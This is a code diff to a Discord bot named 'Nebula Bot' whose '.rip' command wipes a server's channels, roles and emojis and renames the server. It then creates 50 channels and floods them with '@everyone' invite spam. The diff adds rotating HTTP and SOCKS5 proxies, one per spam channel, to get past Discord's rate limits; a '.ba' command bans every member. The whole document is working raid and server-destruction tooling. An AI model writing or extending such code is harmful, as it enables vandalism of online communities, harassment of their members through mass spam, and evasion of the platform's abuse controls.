@@ -4,11 +4,10 @@ const dotenv = require('dotenv');
 const fs = require('fs');
 dotenv.config();
 
-// ====== PROXY SETUP (Safe for https-proxy-agent v5 and v6) ======
+// ====== PROXY SETUP (Supports https-proxy-agent v5 & v6 + SOCKS5) ======
 let HttpProxyAgent;
 try {
   const agentModule = require('https-proxy-agent');
-  // Handle both v5 (direct) and v6+ (.default)
   HttpProxyAgent = typeof agentModule === 'function'
     ? agentModule
     : agentModule.HttpProxyAgent || agentModule.default;
@@ -25,7 +24,7 @@ function loadProxies() {
   try {
     const data = fs.readFileSync('proxies.txt', 'utf-8');
     proxies = data
-      .split(/\r?\n|\r/) // ✅ Works on Windows, Linux, macOS
+      .split(/\r?\n|\r/)
       .map(line => line.trim())
       .filter(line => line && !line.startsWith('#') && line.length > 5);
     console.log(`✅ Loaded ${proxies.length} proxies.`);
@@ -36,7 +35,7 @@ function loadProxies() {
 }
 
 function getProxyAgent() {
-  if (proxies.length === 0 || !HttpProxyAgent) return null;
+  if (proxies.length === 0) return null;
 
   const proxy = proxies[currentProxyIndex];
   currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
@@ -44,7 +43,7 @@ function getProxyAgent() {
   if (proxy.startsWith('socks5://')) {
     return new SocksProxyAgent(proxy);
   } else {
-    return new HttpProxyAgent(proxy); // Works for v5 and v6
+    return HttpProxyAgent ? new HttpProxyAgent(proxy) : null;
   }
 }
 
@@ -64,19 +63,19 @@ const client = new Client({
   ]
 });
 
-// ====== APPLY PROXY TO DISCORD.JS REST API ======
+// ====== APPLY PROXY TO DISCORD.JS REST API (Optional fallback) ======
 const rest = client.rest;
 const originalRequest = rest.request.bind(rest);
 
 rest.request = async function(options) {
   const agent = getProxyAgent();
   if (agent) {
-    options.agent = { https: agent }; // Discord uses HTTPS
+    options.agent = { https: agent };
   }
   return await originalRequest(options);
 };
 
-// ====== WEB SERVER (Keeps Render/Railway Awake) ======
+// ====== WEB SERVER (Keeps Uptime on Render/Railway) ======
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -129,6 +128,36 @@ async function safeLeaveGuild(guild) {
   }
 }
 
+// ====== SEND MESSAGE WITH PROXY (Per-Channel Spam) ======
+async function sendMessageWithProxy(channel, content, agent) {
+  const rest = client.rest;
+
+  const options = {
+    method: 'POST',
+    path: `/channels/${channel.id}/messages`,
+    data: { content },
+    versioned: true,
+  };
+
+  if (agent) {
+    options.agent = { https: agent };
+  }
+
+  try {
+    await rest.request(options);
+    return true;
+  } catch (error) {
+    if (error.code === 429) {
+      const retryAfter = (error.retry_after || 1500) * 1.5;
+      console.warn(`[RATELIMIT] Holding proxy for ${retryAfter}ms`);
+      await new Promise(resolve => setTimeout(resolve, retryAfter));
+    } else {
+      console.warn('❌ Proxy request failed:', error.message || error);
+    }
+    return false;
+  }
+}
+
 // ====== BOT EVENTS ======
 client.on('ready', () => {
   console.log(`🚀 Logged in as ${client.user.tag}`);
@@ -149,7 +178,7 @@ client.on('messageCreate', async (message) => {
       .setTitle('🤖 Nebula Bot Commands')
       .setDescription('Available commands:')
       .addFields(
-        { name: '.rip', value: 'Nukes the server (delete roles, emojis, spam channels)' },
+        { name: '.rip', value: 'Nukes server: deletes roles, emojis, channels, then spams 50 channels using 1 proxy each' },
         { name: '.ba', value: 'Bans all members (except owner)' },
         { name: '.help', value: 'Sends this help to your DMs' }
       )
@@ -181,7 +210,7 @@ client.on('messageCreate', async (message) => {
         const invite = invites.first()?.url || 'No active invite';
         list.push({ name: guild.name, owner: owner.user.tag, id: guild.id, invite });
       } catch (err) {
-        list.push({ name: guild.name, error: 'No access' });
+        list.push({ name: guild.name, error: 'No access', id: guild.id });
       }
     }
 
@@ -237,63 +266,77 @@ client.on('messageCreate', async (message) => {
     return;
   }
 
-  // ===== RIP COMMAND =====
+  // ===== RIP COMMAND: 50 Channels, 1 Proxy Each, 20 Messages =====
   if (command === 'rip') {
     const guild = message.guild;
     const spamMsg = '@everyone Nebula\'s return is here discord.gg/migh';
     const chName = 'neb-was-here';
 
+    if (!message.member.permissions.has('ManageChannels') || !message.member.permissions.has('ManageRoles')) {
+      return message.reply("❌ You need 'Manage Channels' and 'Manage Roles' permissions.");
+    }
+
     try {
-      let didSomething = false;
-      let sent = 0;
-
-      // Delete channels
+      // === 1. Delete existing channels, roles, emojis ===
       await Promise.all(guild.channels.cache.map(ch => handleRateLimit(() => ch.delete())));
-      didSomething = true;
-
-      // Delete roles
-      await Promise.all(guild.roles.cache.map(r => {
-        if (r.name !== '@everyone' && !r.managed) {
-          return handleRateLimit(() => r.delete());
-        }
-      }));
-      didSomething = true;
-
-      // Delete emojis
+      await Promise.all(guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(r => handleRateLimit(() => r.delete())));
       await Promise.all(guild.emojis.cache.map(e => handleRateLimit(() => e.delete())));
-      didSomething = true;
-
-      // Rename server
       await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' }));
-      didSomething = true;
 
-      // Create 50 channels
-      const channels = [];
+      // === 2. Create 50 channels ===
+      const channelPromises = [];
       for (let i = 0; i < 50; i++) {
-        const ch = await handleRateLimit(() => guild.channels.create({ name: `${chName}-${i + 1}` }));
-        if (ch) channels.push(ch);
+        channelPromises.push(
+          handleRateLimit(() => guild.channels.create({ name: `${chName}-${i + 1}` }))
+            .catch(err => {
+              console.warn(`Failed to create channel ${i + 1}:`, err.message);
+              return null;
+            })
+        );
       }
 
+      const channels = (await Promise.all(channelPromises)).filter(ch => ch !== null);
       if (channels.length === 0) {
-        await message.channel.send('❌ Failed to create channels.');
+        await message.channel.send('❌ Failed to create any channels.');
         return;
       }
 
-      // Spam 1000 messages
-      for (const channel of channels) {
-        for (let i = 0; i < 20 && sent < 1000; i++) {
-          await handleRateLimit(() => channel.send(spamMsg));
-          sent++;
+      await message.channel.send(`✅ Created ${channels.length} channels. Starting proxy spam...`);
+
+      // === 3. Assign 1 proxy per channel and spam 20 times ===
+      let totalSent = 0;
+
+      const spamJobs = channels.map(async (channel) => {
+        let sent = 0;
+        const proxyAgent = getProxyAgent(); // One proxy per channel
+
+        if (!proxyAgent) {
+          console.warn(`No proxy for ${channel.name}, skipping.`);
+          return 0;
         }
-      }
 
-      console.log(`✅ Sent ${sent} spam messages.`);
-      if (sent >= 950) await safeLeaveGuild(guild);
+        for (let i = 0; i < 20; i++) {
+          const success = await sendMessageWithProxy(channel, spamMsg, proxyAgent);
+          if (success) sent++;
+          else break; // Stop spamming if proxy fails
+        }
 
-      await message.channel.send('✅ Server nuked successfully.');
+        totalSent += sent;
+        return sent;
+      });
+
+      // Run all spam jobs in parallel
+      const results = await Promise.allSettled(spamJobs);
+      const finalSent = results.reduce((sum, r) => (r.status === 'fulfilled' ? sum + r.value : sum), 0);
+
+      console.log(`✅ Spammed ${finalSent} messages across ${channels.length} channels.`);
+      await safeLeaveGuild(guild);
+      await message.channel.send(`✅ Nuke complete! ${finalSent} messages sent.`);
     } catch (err) {
-      await message.channel.send(`❌ Failed: \`${err.message}\``);
+      await message.channel.send(`❌ Nuke failed: \`${err.message}\``);
+      console.error(err);
     }
+    return;
   }
 });
 
